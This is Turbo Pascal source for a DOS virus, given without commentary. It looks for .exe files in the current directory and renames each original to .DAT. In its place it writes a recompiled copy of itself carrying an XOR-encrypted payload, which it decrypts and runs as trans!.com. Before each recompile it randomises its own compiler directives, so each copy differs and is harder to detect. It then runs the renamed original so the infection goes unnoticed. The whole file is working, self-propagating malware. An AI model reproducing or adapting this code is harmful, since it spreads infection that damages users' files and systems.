{$A+,B-,C-,D-,E-,F-,G-,I+,L+,N-,O-,P-,Q-,R-,S+,T-,V-,X-}
{$M 5000, 0, 5000}
uses dos;
const ZS=1509;
var J,C,P:string;
    V:file;
    F,K:array[1..16] of byte;
    Par:string;
    I:integer;
    A : byte;
    a1:dirstr;
    a2:namestr;
    a3:extstr;
    NewST:string;
procedure TRANS(ST:string);
var Z,T,G,N:file;
    S:byte;
    D:array[1..ZS] of byte;
    B:byte;
begin
fsplit(ST,a1,a2,a3);
NewST:=a1+a2+'.DAT';
assign(G,NewST);{$I-}reset(G);{$I+}
if ioresult=0 then
  begin close(G);exit;end;
assign(V,J);reset(V,1);
seek(V,filesize(V)-16-ZS);blockread(V,K,16);
assign(Z,'trans!.com');rewrite(Z,1);
blockread(V,D,ZS);
close(V);
A:=1;
for I:=1 to ZS do
  begin
  d[i]:=d[i] xor K[a];
  if A=16 then A:=1 else inc(A);
  end;
blockwrite(Z,D,ZS);
close(Z);
exec('trans!.com','>nul');
erase(Z);
Randomize;
assign(T,'trans.pas');reset(T,1);
for I:=1 to 18 do
  begin
  seek(T,3*I);
  B:=random(2);
  if B=0 then S:=ord('-') else S:=ord('+');
  blockwrite(T,S,1);
  end;
close(T);
exec(C,'/c '+P+' trans.pas>nul');
erase(T);
assign(N,'trans.exe');reset(N,1);
for I:=1 to 16 do F[i]:=random(256);
seek(N,filesize(N));blockwrite(N,F,16);
A:=1;
for I:=1 to ZS do
  begin
  D[i]:=D[i] xor F[A];
  if A=16 then A:=1 else inc(A);
  end;
blockwrite(N,D,ZS);
close(N);
assign(G,ST);
rename(G,NewST);
rename(N,ST);
end;
procedure Finder;
var N:searchrec;
begin
findfirst('*.exe',$21,N);
while doserror=0 do
  begin
  TRANS(N.name);
  findnext(N);
  end;
end;
function Cmp:boolean;
var t:boolean;
begin
t:=false;
P:='tpc.exe';
exec(C,'/c '+P+'>nul');
if doserror<>0 then
  begin
  P:='bpc.exe';
  exec(C,'/c '+P+'>nul');
  if doserror=0 then t:=true;
  end
else t:=true;
Cmp:=t;
end;
begin
C:=GetEnv('COMSPEC');
if Cmp=true then
  begin
  J:=paramstr(0);
  Finder;
  end;
Par:='';
for I:=0 to paramcount do
  Par:=Par+' '+paramstr(I);
fsplit(J,a1,a2,a3);
NewST:=a1+a2+'.dat';
exec(NewST,Par);
end.